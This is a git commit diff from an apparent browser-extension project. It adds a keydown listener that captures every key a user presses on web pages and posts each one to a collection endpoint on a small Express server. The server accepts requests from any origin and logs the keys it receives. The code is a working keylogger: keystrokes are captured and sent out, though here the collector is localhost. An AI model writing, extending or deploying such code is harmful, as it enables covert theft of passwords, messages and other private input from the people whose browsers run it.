4c1524c3b441ae3f661976b0538f27532563d8d1
Pedro Meira <petergamer8k@gmail.com>
2022-05-15 22:54:58 -0300

    Finishing the first part (sending the pressed key)

--- extension/js/main.js
+++ extension/js/main.js
@@ -1,11 +1,16 @@
 const keysPressed = [];
+const url = "http://localhost:3333/saveKey";
 
 function handleKeyDown(e) {
     const key = e.key;
     saveKeyPressed(key);
-    console.log(`[${keysPressed[keysPressed.length - 1].keyPressed}]`, keysPressed[keysPressed.length - 1].date);
+    console.log(`[ ${keysPressed[keysPressed.length - 1].keyPressed} ]`);
 
 }
+
+
+
+window.addEventListener('keydown', handleKeyDown);
 
 
 function saveKeyPressed(keyPressed) {
@@ -16,7 +21,17 @@ function saveKeyPressed(keyPressed) {
     }
 
     keysPressed.push(key);
+
+
+    postMethod(url, { keyPressed });
 }
 
 
-window.addEventListener('keydown', handleKeyDown);
+function postMethod(url, body) {
+    const xhr = new XMLHttpRequest()
+    xhr.open("POST", url, true)
+    xhr.setRequestHeader("Content-type", "application/json");
+    xhr.send(JSON.stringify({ key: body.keyPressed }));
+
+
+}
--- server/server.js
+++ server/server.js
@@ -1,5 +1,17 @@
 const express = require('express');
+const cors = require('cors')
 const app = express();
+
+
+
+app.use(cors());
+
+
+
+app.use(express.json());
+const savedKeys = [];
+
+
 
 app.get('/', function(req, res) {
     res.json({
@@ -11,7 +23,13 @@ app.get('/', function(req, res) {
 app.post('/saveKey', function(req, res) {
 
 
-})
+
+    console.log(req.body);
+
+
+    return res.status(201).send();
+});
+
 
 app.listen(3333, () => {
     console.log("http server running");
